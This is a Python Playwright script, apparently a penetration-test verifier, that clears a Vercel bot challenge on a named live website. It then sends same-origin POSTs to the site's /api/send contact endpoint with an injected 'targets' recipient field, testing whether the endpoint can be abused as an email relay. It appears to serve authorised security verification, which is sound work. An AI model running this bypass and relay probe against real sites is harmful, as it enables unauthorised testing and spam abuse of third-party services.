#!/usr/bin/env python3
"""Independent verifier: use a real browser to clear the Vercel challenge,
then exercise POST /api/send from inside the page context (same-origin fetch),
sending ONLY to addresses under the in-scope domain infinitycapital.bh."""
import json, sys, time
from playwright.sync_api import sync_playwright

BASE = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome Safari/537.36")

out = {}

def post(page, label, targets):
    """Same-origin fetch to /api/send from the real page context."""
    res = page.evaluate("""async (targets) => {
        const fd = new FormData();
        fd.set("fname","Iv"); fd.set("lname","Audit");
        fd.set("areacode","+973"); fd.set("tel","3600000");
        fd.set("cname","RelayCheck");
        fd.set("subject","Verifier probe"); fd.set("msg","verifier probe body");
        fd.set("check","0");
        if (targets !== null) fd.set("targets", targets);
        try {
            const r = await fetch("/api/send", {method:"POST", body:fd});
            const t = await r.text();
            return {status:r.status, body:t.slice(0,1500)};
        } catch(e) { return {error:String(e)}; }
    }""", targets)
    out[label] = {"targets": targets, **res}
    print(f"--- {label} targets={targets} -> {json.dumps(res)[:700]}")
    return res

with sync_playwright() as p:
    b = p.chromium.launch(args=["--no-sandbox"])
    ctx = b.new_context(user_agent=UA, locale="en-US")
    page = ctx.new_page()
    page.goto(BASE + "/contact", wait_until="domcontentloaded", timeout=60000)
    # let the Vercel checkpoint script run / retry
    for i in range(6):
        if "challenge" not in page.title().lower() and "checkpoint" not in page.title().lower():
            break
        time.sleep(5)
    out["title_after_clear"] = page.title()
    out["url_after_clear"] = page.url
    print("TITLE:", out["title_after_clear"], "URL:", out["url_after_clear"])

    # 1) baseline: no targets field at all
    post(page, "A_no_targets_baseline", None)
    # 2) attacker-supplied recipient on the in-scope corporate domain
    post(page, "B_targets_own_domain", "info@infinitycapital.bh")
    page.screenshot(path="/work/evidence/ivb_after.png")
    json.dump(out, open("/work/evidence/ivb_results.json", "w"), indent=2)
    ctx.close(); b.close()
print(json.dumps(out, indent=2)[:3000])
